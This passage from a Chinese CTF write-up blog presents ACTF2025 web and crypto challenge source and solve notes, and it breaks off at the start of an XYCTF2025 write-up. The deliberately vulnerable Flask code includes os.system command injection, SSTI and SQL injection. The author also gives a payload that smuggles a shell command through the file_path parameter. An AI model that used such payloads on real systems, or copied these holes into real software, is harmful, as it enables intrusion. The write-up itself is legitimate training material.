class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这里给了<code>admin</code>密码的<strong>哈希值</strong>，爆破一手，我用的<code>passwd-EN-Top10000</code>，得到密码为<code>backdoor</code></p><p>然后关注最后的条件判断，可以看到有<strong>命令执行</strong>，<code>file_path</code>我们是可控的，这里只有<strong>admin</strong>可以<strong>命令执行</strong>但不能读文件，而普通用户是可以<strong>直接读文件</strong>的</p><p>所以思路就是<strong>admin</strong>传参命令执行<strong>重定向</strong>，然后普通用户读</p><p><strong>admin: /upload?file_path=;cat /Fl4g_is_H3r3 &gt; ./uploads/flag;#</strong><br><strong>普通用户：/upload?file_path=flag</strong></p><h2 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site*"></a>Excellent-Site*</h2><blockquote><p>My site is PERFECT!!!<br>hosts: 0.0.0.0 ezmail.org</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib </span><br><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_subjects</span>(<span class="params">username, password</span>):</span><br><span class="line">    imap_server = <span class="string">&quot;ezmail.org&quot;</span></span><br><span class="line">    imap_port = <span class="number">143</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail = imaplib.IMAP4(imap_server, imap_port)</span><br><span class="line">        mail.login(username, password)</span><br><span class="line">        mail.select(<span class="string">&quot;inbox&quot;</span>)</span><br><span class="line">        status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> status != <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        subject = <span class="string">&quot;&quot;</span></span><br><span class="line">        latest_email = messages[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">        status, msg_data = mail.fetch(latest_email, <span class="string">&quot;(RFC822)&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">                msg = email.message_from_bytes(response_part  [<span class="number">1</span>])</span><br><span class="line">                subject, encoding = decode_header(msg[<span class="string">&quot;Subject&quot;</span>])  [<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                    subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        mail.logout()</span><br><span class="line">        <span class="keyword">return</span> subject</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_page_content</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme != <span class="string">&#x27;http&#x27;</span> <span class="keyword">or</span> parsed_url.hostname != <span class="string">&#x27;ezmail.org&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;SSRF Attack!&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        smtplib._quote_periods = <span class="keyword">lambda</span> x: x</span><br><span class="line">        mail_content = <span class="string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP(<span class="string">&quot;ezmail.org&quot;</span>)</span><br><span class="line">            mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">            mail_content = mail_content.<span class="built_in">format</span>(url=url, content=content)</span><br><span class="line">            server.sendmail(<span class="string">&quot;ignored@ezmail.org&quot;</span>, <span class="string">&quot;admin@ezmail.org&quot;</span>, mail_content)</span><br><span class="line">            message = <span class="string">&quot;Submitted! Now wait till the end of the world.&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Send FAILED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;report.html&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    requests.get(<span class="string">&quot;http://ezmail.org:3000/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;The admin is checking your advice(maybe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden IP&quot;</span></span><br><span class="line">    subject = get_subjects(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;p@ssword&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> subject.startswith(<span class="string">&quot;http://ezmail.org&quot;</span>):</span><br><span class="line">        page_content = fetch_page_content(subject)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;<span class="subst">&#123;page_content&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> news_id:</span><br><span class="line">        news_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;news.db&quot;</span>)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">f&quot;SELECT title FROM news WHERE id = <span class="subst">&#123;news_id&#125;</span>&quot;</span>)</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Page not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>注意到<code>/admin</code>路由下是可以打<code>SSTI</code>的</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easy-log"><a href="#easy-log" class="headerlink" title="easy_log*"></a>easy_log*</h2><blockquote><p>E@sy L0g</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"></span><br><span class="line">Point = namedtuple(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;x y&quot;</span>)</span><br><span class="line">O = <span class="string">&quot;Origin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_addition</span>(<span class="params">P, Q, n</span>):</span><br><span class="line"><span class="keyword">if</span> P == O:</span><br><span class="line"><span class="keyword">return</span> Q</span><br><span class="line"><span class="keyword">if</span> Q == O:</span><br><span class="line"><span class="keyword">return</span> P</span><br><span class="line">x = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n</span><br><span class="line">y = (P.x * Q.x + P.y * Q.y) % n</span><br><span class="line"><span class="keyword">return</span> Point(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_and_add</span>(<span class="params">k, P, n</span>):</span><br><span class="line">Q = P</span><br><span class="line">R = O</span><br><span class="line"><span class="keyword">while</span>(k &gt; <span class="number">0</span>):</span><br><span class="line"><span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">R = point_addition(R, Q, n)</span><br><span class="line">k &gt;&gt;= <span class="number">1</span></span><br><span class="line">Q = point_addition(Q, Q, n)</span><br><span class="line"><span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">50</span></span><br><span class="line">flag = urandom(randint(<span class="number">38</span>, <span class="number">48</span>)) + flag</span><br><span class="line">flag = flag + urandom(<span class="number">118</span> - <span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line">flag1, flag2 = bytes_to_long(flag[:<span class="number">68</span>]), bytes_to_long(flag[<span class="number">68</span>:])</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000</span></span><br><span class="line">G1 = Point(<span class="number">0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d</span>, <span class="number">0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57</span>)</span><br><span class="line">G2 = Point(<span class="number">0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7</span>, <span class="number">0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19</span>)</span><br><span class="line"></span><br><span class="line">f1 = double_and_add(flag1, G1, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag1 != <span class="built_in">int</span>(<span class="built_in">input</span>()):</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> p.bit_length() == <span class="number">400</span></span><br><span class="line"></span><br><span class="line">f2 = double_and_add(flag2, G2, p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f2)</span><br></pre></td></tr></table></figure><h2 id="AAALLL"><a href="#AAALLL" class="headerlink" title="AAALLL*"></a>AAALLL*</h2><blockquote><p>Let’s welcome AAA’s LLL master!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, sample</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_ternery_poly</span>(<span class="params">Q</span>):</span><br><span class="line">    <span class="keyword">return</span> Q([choice([-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Q.degree())])</span><br><span class="line"></span><br><span class="line">n = <span class="number">450</span></span><br><span class="line">p = <span class="number">3774877201</span></span><br><span class="line">t = n//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">g = x^n+<span class="number">1</span></span><br><span class="line">roots = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> g.roots()]</span><br><span class="line"></span><br><span class="line">subset = sample(roots, t)</span><br><span class="line"></span><br><span class="line">Q.&lt;x&gt; = P.quotient(x^n+<span class="number">1</span>)</span><br><span class="line">f = sample_ternery_poly(Q)</span><br><span class="line">f_lift = f.lift()</span><br><span class="line">values = [f_lift(i) <span class="keyword">for</span> i <span class="keyword">in</span> subset]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;subset: <span class="subst">&#123;subset&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;values: <span class="subst">&#123;values&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(f.<span class="built_in">list</span>()).encode()).digest()</span><br><span class="line">aes = AES.new(key = key, mode = AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct: <span class="subst">&#123;aes.encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">subset: [1040018022, 3719840057, 2086762603, 3065369513, 3179320758, 891114580, 966265556, 664146925, 1232096603, 1449704729, 2810118429, 2891821810, 698162894, 3070228878, 3114653287, 2793650430, 2941920517, 1811454265, 325024118, 1860481904, 555392385, 2818572232, 3719972491, 981226771, 1777524396, 2717373523, 3694549306, 91210020, 1397236365, 2806262125, 1966653548, 1369610707, 3545263790, 595556443, 1601356313, 2865921937, 2795518764, 1690002428, 3501122295, 2078440315, 1222414863, 1997352805, 271758023, 3348936352, 1800648013, 410072905, 3378691273, 185134810, 1281817316, 821730517, 2855781188, 3353349707, 273754906, 1187616168, 569728457, 401428606, 3671298095, 149603298, 2300569286, 1057503678, 1915386614, 2716934671, 2005635066, 389589525, 2691165686, 586877133, 2874838, 660954102, 3258633701, 1083711515, 1785913794, 3410290851, 1914395297, 2544074509, 3076714307, 2169463229, 2654223166, 3648299978, 3188000068, 1130206965, 875184747, 2549126013, 3602874619, 80327895, 983400559, 2423201604, 3384400899, 654136379, 1835112234, 3302809337, 3388376496, 364586350, 3219484816, 52162306, 3488542302, 2843511894, 638341256, 427235375, 757491483, 3364804296, 172002582, 3112473265, 2746078509, 2118542465, 421527494, 3017385718, 3683667181, 3536621837, 3113923099, 1989065494, 1769242135, 1541932517, 1963422936, 2341204092, 3306256995, 186750428, 1381468653, 1288011784, 229613411, 839241230, 425544589, 2345390466, 2552462338, 286334899, 2984993503, 3741109364, 103579106, 138703348, 2369990075, 2377640836, 1279106009, 2542780598, 1653097443, 3373448595, 2405266494, 3385287676, 289622793, 2376573706, 3096235437, 1971476669, 3449853083, 3565565810, 762810383, 272826480, 516243500, 1710511548, 3233762177, 2013126070, 224313638, 1884110819, 3141861971, 2014729696, 1572103482, 2232944684, 2644670236, 1350302342, 3589742391, 2106163918, 1077036824, 3527373372, 2474464298, 971863088, 1219963894, 3349332612, 1474307915, 905651245, 2666266327, 2192845472, 2748042118, 1489782942, 1300412903, 126577223, 545427793, 360417066, 704648323, 3562938536, 908955264, 1108610874, 247503829, 2379959160, 1059927520, 2869225956, 2202773719, 1498564318, 2032958616, 3485254408, 1091224495, 3287849020, 780873181, 3410363615, 1398303495, 2426564739, 487028181, 1230802692, 139226346, 789883698, 2557862280, 2994004020, 3205148744, 2914199937, 1803400532, 2738281702, 883055391, 1761751131, 1220550272, 1947825121, 3543565567, 1939764967, 2986882625, 798323428, 1120654035, 3722714895, 3679983602, 364513586, 1760147505, 472067864, 2393408548, 2239781327, 799334306, 3497260623, 2769084221, 860677264, 990410164, 3772002363, 2883762621]</span></span><br><span class="line"><span class="string">values: [712538976, 1225537965, 2633482204, 1245652635, 2529155164, 1672980719, 3024410928, 1535384351, 2252244320, 672919726, 2976916118, 3089453551, 2512277279, 2431400831, 1129198075, 3441247454, 610984549, 2043949242, 3306515233, 2759625250, 2459507335, 2885552592, 3226187015, 983312810, 1815610133, 871259259, 3651562935, 570267317, 2548725905, 70380481, 685470168, 1925389996, 2466124957, 1512923993, 2603725653, 409457162, 859041441, 3193931087, 786021320, 2481319115, 2379423262, 1972220678, 251474531, 448830331, 3189297419, 845468707, 3014186402, 1476144624, 1412175603, 464556671, 1251535251, 2252149066, 3501165225, 1173484383, 1168113959, 2547845342, 3132683037, 182880838, 3236782773, 637440805, 1077834200, 910992912, 1281164705, 763525563, 1025793488, 3031918542, 2457090411, 159146268, 3252417067, 1695150089, 1863899429, 2660689081, 647461624, 3736679821, 2034134877, 973654854, 1545264273, 692989149, 769387639, 2024000598, 2916906076, 1996631367, 2889527392, 527082343, 3319918691, 3629378248, 685639382, 2659312228, 472574946, 1237496521, 434512296, 3649895972, 3500730074, 1092276151, 1513927060, 1179642291, 474879861, 1132457849, 3072787035, 1536862618, 3131879287, 1635514910, 2467715064, 2377496874, 2888951190, 3697148067, 1885811970, 1037114846, 2862197847, 2248493059, 829223452, 17390497, 1063920331, 2504310664, 2269937803, 667770896, 1855657371, 323906741, 2972650844, 3620395133, 2613325861, 2508686438, 2143229100, 977352912, 3380653143, 2367018411, 1665354812, 2473914413, 3531805346, 2023595772, 1909192693, 844059686, 2233570033, 1997039839, 3558799006, 2872633369, 1949018254, 3159312415, 3021409934, 2505867881, 2357897866, 3436059930, 1496867815, 594001374, 3433203342, 2396280741, 2696363547, 1775021594, 434891096, 862244228, 1372573410, 3003385341, 3051290794, 493688483, 2143128679, 394087901, 3668481745, 1085467544, 2438896216, 1782052147, 2415529482, 149721114, 1539904401, 1902915995, 1929333694, 1759980967, 2106193398, 3670877657, 2736025727, 3133082490, 182590224, 1099952929, 3522052498, 2206338880, 1925988633, 3440533747, 25471854, 325651518, 72348028, 3178620735, 3335468600, 818634602, 2932340363, 1163855672, 2453716531, 373827915, 2373018915, 2231504345, 2975884007, 3636085022, 2354093635, 2696203979, 799834661, 2412088324, 1446875965, 3299868618, 302142905, 1957341475, 1522953201, 1257060525, 3769499753, 1591149900, 295691418, 3249943297, 1280379656, 1164820140, 115871117, 219831260, 2505969457, 2618672354, 2781617927, 2886486193, 1648555579, 1265576372, 1720183485, 2424145699, 2772052592, 2399827477, 626825210, 2422432913, 322266950, 2157976175, 2208875362, 2216568965, 3223085486]</span></span><br><span class="line"><span class="string">ct: b&#x27;&quot;\xf2Y\xf0\x15\xc5x\x94\xb9E\xbd\xd3\xa7\xb1\xad\x00\xa2D*+\x87BQ_20\x87\xa2\nP\xfc\xce\x0eW\xaf\xd8-.\xb5\xfai\xf1\xf6*\xben^\xd5&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul><li><a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup">星盟</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;signin&quot;&gt;&lt;a href=&quot;#signin&quot; class=&quot;headerlink&quot; title=&quot;signi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/</id>
    <published>2025-04-07T19:19:43.000Z</published>
    <updated>2025-04-07T19:57:44.085Z</updated>
    
    <content type="html"><![CDATA[<p><strong>*代表未解决，可能是卡了，也可能是没思路了，简单做个记录，然后跑了，再或者是后续没来得及复现，在此处留个坑，等以后回来填上……</strong></p><p><a href="https://gz.imxbt.cn/games/23">复现网址</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h2><blockquote><p>LamentXU学不明白除法了，能教教我吗？（adwa这个骗人的大坏蛋&gt;_&lt;，这个才是签到啊）</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   server.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/20 12:25:03</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">menu:</span></span><br><span class="line"><span class="string">      [1]  Division calc</span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)</span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)</span><br><span class="line">        